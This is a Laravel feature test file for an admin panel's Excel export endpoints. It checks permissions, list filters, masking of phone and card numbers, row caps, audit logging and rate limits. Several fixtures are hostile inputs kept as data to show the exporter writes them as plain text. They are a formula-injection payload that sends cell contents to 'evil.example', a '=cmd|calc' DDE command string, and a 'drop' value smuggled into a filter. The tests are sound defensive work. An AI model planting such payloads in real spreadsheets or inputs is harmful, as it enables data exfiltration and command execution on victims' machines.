<?php

namespace Tests\Feature\AdminMetrics;

use App\Enums\AdminPermission;
use App\Enums\OrderStatus;
use App\Enums\PlatformRole;
use App\Models\AuditLog;
use App\Models\PayoutRequest;
use App\Models\Store;
use App\Models\StoreApplication;
use App\Models\StoreTopupRequest;
use App\Services\Admin\AdminPermissionService;
use App\Services\Admin\Export\XlsxExporter;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Testing\TestResponse;
use OpenSpout\Reader\XLSX\Reader;
use Tests\Feature\AdminPos\AdminPosFixtures;
use Tests\TestCase;

/**
 * P4-31: the Excel exports of the lists (GET /admin/exports/*): the permission pair (admin.export and the list's own),
 * the list's filters, masked phones, text-only cells, the row cap, the audit entry and the rate limit.
 */
class AdminExportTest extends TestCase
{
    use AdminPosFixtures;
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Cache::flush();
        config(['admin.export.per_minute' => 1000]);
        $this->setUpManagement();
        $this->store->forceFill(['phone' => '+998901112233'])->save();
    }

    private function token(PlatformRole $role = PlatformRole::SUPERADMIN): string
    {
        return $this->signIn($this->makeMember($role));
    }

    private function export(string $path, string $token, array $query = []): TestResponse
    {
        return $this->adminJson('GET', '/exports/' . $path . ($query === [] ? '' : '?' . http_build_query($query)), $token);
    }

    /**
     * @return array<string, list<list<mixed>>> sheet name => rows
     */
    private function sheets(TestResponse $response): array
    {
        $reader = new Reader();
        $reader->open($response->baseResponse->getFile()->getPathname());
        $sheets = [];
        foreach ($reader->getSheetIterator() as $sheet) {
            foreach ($sheet->getRowIterator() as $row) {
                $sheets[$sheet->getName()][] = $row->toArray();
            }
        }
        $reader->close();

        return $sheets;
    }

    /**
     * @return list<list<mixed>> the data rows of the first sheet (without the header)
     */
    private function dataRows(TestResponse $response): array
    {
        return array_slice(array_values($this->sheets($response))[0], 1);
    }

    private function order(array $attributes = []): \App\Models\Order
    {
        return $this->makeOrder(OrderStatus::NEW, $attributes + ['channel' => 'telegram']);
    }

    // --- permissions -------------------------------------------------------------------------------------------------

    public function test_every_export_needs_admin_export_and_the_lists_own_view_permission(): void
    {
        $paths = ['orders', 'stores', 'store-applications', 'finance/payouts', 'finance/topups', 'finance/balances', 'pos/invoices', 'pos/devices', 'audit-logs'];

        // Nobody signed in
        foreach ($paths as $path) {
            $this->adminJson('GET', "/exports/{$path}")->assertUnauthorized();
        }

        // The read-only role sees every list but has no export
        $viewer = $this->token(PlatformRole::VIEWER);
        foreach ($paths as $path) {
            $this->export($path, $viewer)->assertForbidden();
        }

        // Finance holds export, finance.view, orders.view, stores.view: no devices and no audit log
        $finance = $this->token(PlatformRole::FINANCE);
        foreach (['orders', 'stores', 'store-applications', 'finance/payouts', 'finance/topups', 'finance/balances', 'pos/invoices'] as $path) {
            $this->export($path, $finance)->assertOk();
        }
        $this->export('pos/devices', $finance)->assertForbidden();
        $this->export('audit-logs', $finance)->assertForbidden();

        // export alone is not enough: support with export may read orders and stores, not money, devices or the log
        app(AdminPermissionService::class)->setOverride(PlatformRole::SUPPORT, AdminPermission::EXPORT, true);
        $support = $this->token(PlatformRole::SUPPORT);
        $this->export('orders', $support)->assertOk();
        $this->export('stores', $support)->assertOk();
        foreach (['finance/payouts', 'finance/topups', 'finance/balances', 'pos/invoices', 'pos/devices', 'audit-logs'] as $path) {
            $this->export($path, $support)->assertForbidden();
        }

        $superadmin = $this->token();
        foreach ($paths as $path) {
            $this->export($path, $superadmin)->assertOk();
        }
    }

    public function test_invalid_filters_are_refused_like_the_lists_do(): void
    {
        $token = $this->token();

        $this->export('orders', $token, ['status' => 'nope'])->assertStatus(422);
        $this->export('orders', $token, ['channel' => 'pos_hall'])->assertStatus(422);
        $this->export('orders', $token, ['from' => '2026-10-10', 'to' => '2026-10-01'])->assertStatus(422);
        $this->export('stores', $token, ['status' => 'closed'])->assertStatus(422);
        $this->export('store-applications', $token, ['stage' => 'done'])->assertStatus(422);
        $this->export('finance/payouts', $token, ['status' => 'maybe'])->assertStatus(422);
        $this->export('finance/topups', $token, ['provider' => 'paynet'])->assertStatus(422);
        $this->export('finance/balances', $token, ['filter' => 'rich'])->assertStatus(422);
        $this->export('pos/invoices', $token, ['period' => '2026/10'])->assertStatus(422);
        $this->export('pos/devices', $token, ['state' => 'sleeping'])->assertStatus(422);
        $this->export('audit-logs', $token, ['subject_type' => 'Order;drop'])->assertStatus(422);
    }

    // --- the lists ---------------------------------------------------------------------------------------------------

    public function test_the_orders_export_follows_the_list_filters_and_masks_the_phone(): void
    {
        $other = $this->order(['store_id' => $this->foreignStore->id, 'branch_id' => $this->foreignBranch->id, 'total_price' => 70000, 'status' => OrderStatus::DELIVERED]);
        $first = $this->order(['total_price' => 125000.5]);
        $this->order(['channel' => 'pos_hall']);

        $finance = $this->token(PlatformRole::FINANCE);
        $response = $this->export('orders', $finance)->assertOk()->assertDownload();
        $this->assertStringContainsString('filename=rizqim-orders-', $response->baseResponse->headers->get('Content-Disposition'));
        $this->assertSame('2', $response->headers->get('X-Export-Rows'));
        $this->assertSame('0', $response->headers->get('X-Export-Truncated'));

        $sheets = $this->sheets($response);
        $this->assertSame(['Buyurtmalar', XlsxExporter::INFO_SHEET], array_keys($sheets));
        $this->assertSame('Kod', $sheets['Buyurtmalar'][0][0]);
        $rows = array_slice($sheets['Buyurtmalar'], 1);
        // Newest first; a POS hall order is not a marketplace order
        $this->assertSame([(string) $first->uuid, (string) $other->uuid], array_column($rows, 15));
        $this->assertEquals([125000.5, 70000], array_column($rows, 9));
        $this->assertSame('Yangi', $rows[0][1]);
        $this->assertSame('Telegram', $rows[0][2]);
        $this->assertSame('Lifecycle Burger', $rows[0][4]);
        // The customer's phone: masked without admin.pii.view
        $this->assertSame(\App\Support\PiiMask::phone($this->customer->phone), $rows[0][8]);
        $this->assertStringContainsString('***', $rows[0][8]);

        // The list's filters: store, status group, channel, dates, q (a whole phone only for those who may not see phones)
        $this->assertCount(1, $this->dataRows($this->export('orders', $finance, ['store_id' => $this->foreignStore->id])));
        $this->assertCount(1, $this->dataRows($this->export('orders', $finance, ['status' => 'done'])));
        $this->assertCount(0, $this->dataRows($this->export('orders', $finance, ['channel' => 'mobile'])));
        $this->assertCount(0, $this->dataRows($this->export('orders', $finance, ['from' => now()->addDays(2)->toDateString()])));
        $this->assertCount(2, $this->dataRows($this->export('orders', $finance, ['q' => $this->customer->phone])));
        $this->assertCount(0, $this->dataRows($this->export('orders', $finance, ['q' => substr($this->customer->phone, -6)])));
    }

    public function test_a_member_with_pii_view_gets_full_phones_and_one_reveal_entry_for_the_whole_file(): void
    {
        $this->order();
        $this->order();
        $this->order();

        $superadmin = $this->makeMember(PlatformRole::SUPERADMIN);
        $response = $this->export('orders', $this->signIn($superadmin))->assertOk();

        $rows = $this->dataRows($response);
        $this->assertCount(3, $rows);
        $this->assertSame(\App\Support\PiiMask::formatPhone($this->customer->phone), $rows[0][8]);
        $this->assertStringNotContainsString('*', $rows[0][8]);

        // One entry for the file, not one per row, and the export itself
        $reveals = AuditLog::where('action', 'admin.pii.revealed')->get();
        $this->assertCount(1, $reveals);
        $this->assertSame($superadmin->id, (int) $reveals[0]->user_id);
        $this->assertSame('phone', $reveals[0]->payload_json['revealed'][0]['field']);
        $this->assertSame('admin.exports.orders', $reveals[0]->payload_json['route']);
        $this->assertTrue(AuditLog::where('action', 'admin.exports.orders')->sole()->payload_json['phones_shown']);
        $info = collect($this->sheets($response)[XlsxExporter::INFO_SHEET])->keyBy(0);
        $this->assertStringStartsWith("To'liq", $info['Telefon raqamlari'][1]);

        // Nothing revealed when the list has no phones to show
        AuditLog::query()->count();
        $this->export('pos/devices', $this->signIn($superadmin))->assertOk();
        $this->assertSame(1, AuditLog::where('action', 'admin.pii.revealed')->count());
    }

    public function test_the_stores_export_writes_text_as_text_and_takes_the_list_filters(): void
    {
        $evil = '=HYPERLINK("https://evil.example/?d="&A1,"Ochish")';
        $this->store->forceFill(['name' => $evil, 'debt_balance' => '150000.00'])->save();
        $this->foreignStore->forceFill(['status' => 'suspended'])->save();

        $token = $this->token(PlatformRole::FINANCE);
        $response = $this->export('stores', $token)->assertOk();
        $rows = $this->dataRows($response);

        $this->assertCount(2, $rows);
        $byName = collect($rows)->keyBy(1);
        $this->assertTrue($byName->has($evil));
        $this->assertSame(150000.0, (float) $byName[$evil][9]);
        $this->assertSame('Faol', $byName[$evil][2]);
        $this->assertSame("To'xtatilgan", $byName['Foreign Grill'][2]);
        $this->assertStringContainsString('***', $byName[$evil][6]);

        // The name is a string cell, never a formula
        $zip = new \ZipArchive();
        $this->assertTrue($zip->open($response->baseResponse->getFile()->getPathname()));
        $data = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        $this->assertStringNotContainsString('<f>', $data);
        $this->assertStringContainsString('HYPERLINK', $data);

        $this->assertSame(['Foreign Grill'], array_column($this->dataRows($this->export('stores', $token, ['status' => 'suspended'])), 1));
        $this->assertSame([$evil], array_column($this->dataRows($this->export('stores', $token, ['debt' => 'has_debt'])), 1));
        $this->assertSame(['Foreign Grill'], array_column($this->dataRows($this->export('stores', $token, ['q' => 'foreign'])), 1));
    }

    public function test_the_applications_export_takes_the_pipeline_filters(): void
    {
        $make = fn (string $name, string $stage, ?string $due) => StoreApplication::forceCreate([
            'uuid' => (string) Str::uuid(), 'name' => $name, 'format' => 'restaurant', 'owner_name' => 'Ega ' . $name, 'phone' => '+998901234567',
            'source' => 'website', 'stage' => $stage, 'due_on' => $due, 'tin' => '123456789',
        ]);
        $make('Late', 'review', now('Asia/Tashkent')->subDays(3)->toDateString());
        $make('Fresh', 'application', now('Asia/Tashkent')->addDays(2)->toDateString());
        $make('Done', 'active', null);
        $make('=cmd|calc', 'rejected', null);

        $token = $this->token(PlatformRole::FINANCE);
        $rows = $this->dataRows($this->export('store-applications', $token)->assertOk());
        $this->assertSame(['=cmd|calc', 'Done', 'Fresh', 'Late'], array_column($rows, 1));
        $late = collect($rows)->keyBy(1)['Late'];
        $this->assertSame(['Tekshiruv', 'Ha', '123456789'], [$late[9], $late[13], $late[7]]);
        $this->assertSame('+998 90 *** ** 67', $late[6]);

        $names = fn (array $query) => array_column($this->dataRows($this->export('store-applications', $token, $query)), 1);
        $this->assertSame(['Fresh', 'Late'], $names(['stage' => 'open']));
        $this->assertSame(['Late'], $names(['stage' => 'overdue']));
        $this->assertSame(['Done'], $names(['stage' => 'active']));
        $this->assertSame(['Fresh'], $names(['q' => 'fres']));
    }

    public function test_the_finance_exports_follow_their_lists(): void
    {
        $this->store->forceFill(['wallet_balance' => '500000.00', 'debt_balance' => '300000.00', 'subscription_debt' => '149000.00', 'credit_limit' => '-100000.00'])->save();
        $this->foreignStore->forceFill(['debt_balance' => '0', 'wallet_balance' => '0'])->save();

        PayoutRequest::create(['store_id' => $this->store->id, 'amount' => '200000', 'card_number' => '8600123456789012', 'status' => 'pending']);
        PayoutRequest::create(['store_id' => $this->foreignStore->id, 'amount' => '90000', 'card_number' => '8600999988887777', 'status' => 'completed', 'netted_amount' => '10000', 'transferred_amount' => '80000']);
        StoreTopupRequest::create(['uuid' => (string) Str::uuid(), 'store_id' => $this->store->id, 'amount' => '100000', 'provider' => 'click', 'status' => 'paid', 'paid_at' => now()]);
        $stuck = StoreTopupRequest::create(['uuid' => (string) Str::uuid(), 'store_id' => $this->store->id, 'amount' => '50000', 'provider' => 'payme', 'status' => 'pending']);
        $stuck->forceFill(['created_at' => now()->subHours(2)])->saveQuietly();

        $superadmin = $this->token();

        // Payouts: open by default; the card is masked even for those who may see phones
        $payouts = $this->dataRows($this->export('finance/payouts', $superadmin)->assertOk());
        $this->assertCount(1, $payouts);
        $this->assertSame(['Lifecycle Burger', 200000.0, '8600 **** **** 9012'], [$payouts[0][1], (float) $payouts[0][2], $payouts[0][3]]);
        $this->assertCount(2, $this->dataRows($this->export('finance/payouts', $superadmin, ['status' => 'all'])));
        $done = $this->dataRows($this->export('finance/payouts', $superadmin, ['status' => 'completed']));
        $this->assertSame([10000.0, 80000.0], [(float) $done[0][8], (float) $done[0][9]]);
        $this->assertCount(1, $this->dataRows($this->export('finance/payouts', $superadmin, ['status' => 'all', 'store_id' => $this->store->id])));

        // Top-ups
        $this->assertCount(2, $this->dataRows($this->export('finance/topups', $superadmin)));
        $this->assertSame([50000.0, 'payme', 'Ha'], array_map(fn ($v, $i) => $i === 0 ? (float) $v : $v, ...[array_values(array_intersect_key($this->dataRows($this->export('finance/topups', $superadmin, ['stuck' => 1]))[0], [2 => 1, 3 => 1, 6 => 1])), [0, 1, 2]]));
        $this->assertCount(1, $this->dataRows($this->export('finance/topups', $superadmin, ['provider' => 'click'])));
        $this->assertCount(1, $this->dataRows($this->export('finance/topups', $superadmin, ['status' => 'paid'])));

        // Balances: the commission debt is the debt less the subscription debt, over the limit when above it
        $balances = $this->dataRows($this->export('finance/balances', $superadmin, ['filter' => 'debt'])->assertOk());
        $this->assertCount(1, $balances);
        $this->assertSame([500000.0, 300000.0, 149000.0, 151000.0, 100000.0, 'Ha'], array_map('floatval', array_slice($balances[0], 3, 5)) + [5 => $balances[0][8]]);
        $this->assertCount(1, $this->dataRows($this->export('finance/balances', $superadmin, ['filter' => 'over_limit'])));
        $this->assertCount(1, $this->dataRows($this->export('finance/balances', $superadmin, ['filter' => 'wallet'])));
        $this->assertSame(200000.0, (float) $this->dataRows($this->export('finance/balances', $superadmin, ['q' => 'burger']))[0][10]);
        $this->assertCount(2, $this->dataRows($this->export('finance/balances', $superadmin)));
    }

    public function test_the_pos_and_audit_exports_follow_their_lists(): void
    {
        $this->invoice(['number' => 'OB-X-1', 'status' => 'issued', 'due_date' => now('Asia/Tashkent')->subDays(4)->toDateString(), 'period' => '2026-09']);
        $this->invoice(['number' => 'OB-X-2', 'status' => 'paid', 'paid_amount' => '249000.00', 'paid_at' => now(), 'period' => '2026-10']);
        $this->invoice(['number' => 'OB-X-3', 'status' => 'issued', 'period' => '2026-10'], $this->foreignStore);
        $this->device(['name' => 'Online', 'last_seen_at' => now()->subMinutes(2)]);
        $this->device(['name' => '=Offline', 'last_seen_at' => now()->subHours(3), 'app_version' => '1.0.0']);

        $superadmin = $this->token();

        $invoices = $this->dataRows($this->export('pos/invoices', $superadmin)->assertOk());
        $this->assertSame(['OB-X-3', 'OB-X-2', 'OB-X-1'], array_column($invoices, 0));
        $overdue = collect($invoices)->keyBy(0)['OB-X-1'];
        $this->assertSame([249000.0, 249000.0, 4.0], [(float) $overdue[5], (float) $overdue[7], (float) $overdue[12]]);
        $this->assertSame(['OB-X-1'], array_column($this->dataRows($this->export('pos/invoices', $superadmin, ['status' => 'overdue'])), 0));
        $this->assertSame(['OB-X-3', 'OB-X-2'], array_column($this->dataRows($this->export('pos/invoices', $superadmin, ['period' => '2026-10'])), 0));
        $this->assertSame(['OB-X-3'], array_column($this->dataRows($this->export('pos/invoices', $superadmin, ['store_id' => $this->foreignStore->id])), 0));
        $this->assertSame(['OB-X-2'], array_column($this->dataRows($this->export('pos/invoices', $superadmin, ['q' => 'X-2'])), 0));

        $devices = $this->dataRows($this->export('pos/devices', $superadmin)->assertOk());
        $this->assertSame(['=Offline', 'Online'], array_column($devices, 0));
        $this->assertSame(['Oflayn', 'Onlayn'], array_column($devices, 8));
        $this->assertSame(['=Offline'], array_column($this->dataRows($this->export('pos/devices', $superadmin, ['state' => 'offline'])), 0));
        $this->assertSame(['=Offline'], array_column($this->dataRows($this->export('pos/devices', $superadmin, ['outdated' => 1])), 0));

        // The audit log: the exports above are in it, newest first; filters by action prefix and subject
        $log = $this->dataRows($this->export('audit-logs', $superadmin, ['action' => 'admin.exports.pos_invoices'])->assertOk());
        $this->assertCount(5, $log);
        $this->assertSame(['admin.exports.pos_invoices'], array_values(array_unique(array_column($log, 2))));
        $this->assertGreaterThan($log[4][0], $log[0][0]);
        $entry = $log[0];
        $this->assertStringContainsString('"rows"', $entry[12]);
        $this->assertCount(0, $this->dataRows($this->export('audit-logs', $superadmin, ['action' => 'admin.nothing'])));
        $this->assertCount(0, $this->dataRows($this->export('audit-logs', $superadmin, ['subject_type' => 'Order', 'subject_id' => 99999])));
    }

    // --- the file ----------------------------------------------------------------------------------------------------

    public function test_a_long_list_is_cut_at_the_cap_and_the_file_says_so(): void
    {
        config(['admin.export.max_rows' => 3]);
        foreach (range(1, 5) as $i) {
            $this->order(['total_price' => $i * 1000]);
        }

        $response = $this->export('orders', $this->token(PlatformRole::FINANCE))->assertOk();

        $this->assertSame('3', $response->headers->get('X-Export-Rows'));
        $this->assertSame('1', $response->headers->get('X-Export-Truncated'));
        $sheets = $this->sheets($response);
        // Newest first: 5, 4, 3 thousand, then a blank line and the note
        $this->assertSame([5000.0, 4000.0, 3000.0], array_map('floatval', array_column(array_slice($sheets['Buyurtmalar'], 1, 3), 9)));
        $this->assertStringContainsString('kesildi', end($sheets['Buyurtmalar'])[0]);
        $this->assertStringContainsString('3 qatordan keyin kesildi', collect($sheets[XlsxExporter::INFO_SHEET])->flatten()->filter(fn ($v) => is_string($v) && str_contains($v, 'kesildi'))->first());
        $this->assertTrue(AuditLog::where('action', 'admin.exports.orders')->sole()->payload_json['truncated']);

        // Exactly the cap is not a cut
        config(['admin.export.max_rows' => 5]);
        $exact = $this->export('orders', $this->token(PlatformRole::FINANCE))->assertOk();
        $this->assertSame('0', $exact->headers->get('X-Export-Truncated'));
        $this->assertCount(5, $this->dataRows($exact));
    }

    public function test_pages_of_the_export_do_not_skip_or_repeat_rows(): void
    {
        // More rows than one page (1000) would need a long test; the page size is what pages, so use small data with the
        // keyset directly: every id exactly once, newest first
        foreach (range(1, 7) as $i) {
            $this->order();
        }
        $uuids = array_column($this->dataRows($this->export('orders', $this->token(PlatformRole::FINANCE))), 15);

        $this->assertCount(7, array_unique($uuids));
        $this->assertSame(
            \App\Models\Order::query()->orderByDesc('id')->pluck('uuid')->map(fn ($uuid) => (string) $uuid)->all(),
            $uuids,
        );
    }

    public function test_a_list_longer_than_one_page_is_written_whole_across_pages(): void
    {
        \Illuminate\Support\Facades\DB::table('payout_requests')->insert(array_map(fn (int $i) => [
            'store_id' => $this->store->id, 'amount' => (string) ($i * 10), 'card_number' => '8600123456789012', 'status' => 'completed',
            'created_at' => now(), 'updated_at' => now(),
        ], range(1, 2350)));

        $response = $this->export('finance/payouts', $this->token(PlatformRole::FINANCE), ['status' => 'completed'])->assertOk();

        $ids = array_column($this->dataRows($response), 0);
        $this->assertCount(2350, $ids);
        $this->assertCount(2350, array_unique($ids));
        $this->assertSame('2350', $response->headers->get('X-Export-Rows'));
        // Newest (highest id) first
        $this->assertSame($ids, collect($ids)->sortDesc()->values()->all());
    }

    public function test_an_export_is_audited_with_who_which_list_the_filters_and_the_row_count(): void
    {
        $this->order();
        $this->order(['store_id' => $this->foreignStore->id, 'branch_id' => $this->foreignBranch->id]);
        $member = $this->makeMember(PlatformRole::FINANCE);

        $this->export('orders', $this->signIn($member), ['store_id' => $this->store->id, 'status' => 'new', 'q' => $this->customer->phone])->assertOk();

        $entry = AuditLog::where('action', 'admin.exports.orders')->sole();
        $this->assertSame($member->id, (int) $entry->user_id);
        $this->assertSame('orders', $entry->payload_json['list']);
        $this->assertSame(1, $entry->payload_json['rows']);
        $this->assertFalse($entry->payload_json['truncated']);
        $this->assertFalse($entry->payload_json['phones_shown']);
        $this->assertSame((string) $this->store->id, $entry->payload_json['filters']['store_id']);
        $this->assertSame('new', $entry->payload_json['filters']['status']);
        // The search text is free text: a phone typed in it never reaches the log in full
        $this->assertStringNotContainsString(substr($this->customer->phone, -7), json_encode($entry->payload_json));
        $this->assertNotNull($entry->ip);
    }

    public function test_exports_are_throttled_per_member(): void
    {
        config(['admin.export.per_minute' => 2]);
        $token = $this->token(PlatformRole::FINANCE);

        $this->export('stores', $token)->assertOk();
        $this->export('stores', $token)->assertOk();
        $this->export('stores', $token)->assertStatus(429);
        // Another member has their own allowance
        $this->export('stores', $this->token(PlatformRole::FINANCE))->assertOk();
    }

    public function test_an_empty_list_is_a_workbook_with_a_header_and_the_info_sheet(): void
    {
        $response = $this->export('finance/topups', $this->token())->assertOk();

        $sheets = $this->sheets($response);
        $this->assertCount(1, $sheets["Balans to'ldirishlar"]);
        $this->assertSame('ID', $sheets["Balans to'ldirishlar"][0][0]);
        $this->assertSame('0', $response->headers->get('X-Export-Rows'));
        $this->assertSame(["Filtrsiz: butun ro'yxat"], collect($sheets[XlsxExporter::INFO_SHEET])->filter(fn ($row) => str_starts_with((string) ($row[0] ?? ''), 'Filtrsiz'))->first());
    }

    public function test_the_export_matches_the_list_total_for_the_same_filters(): void
    {
        foreach (range(1, 4) as $i) {
            $this->order(['status' => $i % 2 ? OrderStatus::NEW : OrderStatus::DELIVERED]);
        }
        Store::forceCreate(['name' => 'Third', 'slug' => 'third-' . Str::random(4), 'status' => 'suspended']);
        $token = $this->token();

        foreach (['status=new', 'status=done', ''] as $query) {
            $list = $this->adminJson('GET', '/orders?' . $query, $token)->assertOk();
            parse_str($query, $filters);
            $count = count($this->dataRows($this->export('orders', $token, $filters)));
            $groups = $list->json('data.counts');
            $expected = match ($filters['status'] ?? 'all') {
                'new' => $groups['new'],
                'done' => $groups['done'],
                default => count($list->json('data.data')),
            };
            $this->assertSame($expected, $count, "orders {$query}");
        }

        $this->assertSame(
            $this->adminJson('GET', '/stores?status=suspended', $token)->json('data.total'),
            count($this->dataRows($this->export('stores', $token, ['status' => 'suspended']))),
        );
    }
}
